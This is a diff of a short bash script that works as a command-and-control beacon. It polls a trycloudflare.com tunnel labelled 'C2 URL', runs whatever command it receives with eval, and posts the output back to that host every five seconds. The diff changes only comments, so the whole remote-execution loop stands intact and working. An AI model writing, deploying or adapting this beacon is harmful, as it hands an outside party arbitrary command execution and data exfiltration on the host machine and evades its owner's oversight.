@@ -1,20 +1,17 @@
 #!/bin/bash
-# URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
+# C2 URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
 C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
 while true; do
-  # 1. Fetch the command from your Mac
+  # 1. Ask the Mac "What should I run?"
   CMD=$(curl -s "$C2")
   
   if [ ! -z "$CMD" ] && [ "$CMD" != "none" ]; then
-    # 2. Execute and capture EVERYTHING
+    # 2. Run the command and capture everything
     RESULT=$(eval "$CMD" 2>&1)
     
-    # 3. Send the result back to your Mac
+    # 3. Send the answer back to the Mac
     curl -s -X POST --data-binary "$RESULT" "$C2"
-    
-    # 4. Clear the command on your Mac so we don't loop
-    # (Optional: You can manually clear jules_cmd.txt on your Mac)
   fi
   sleep 5
 done
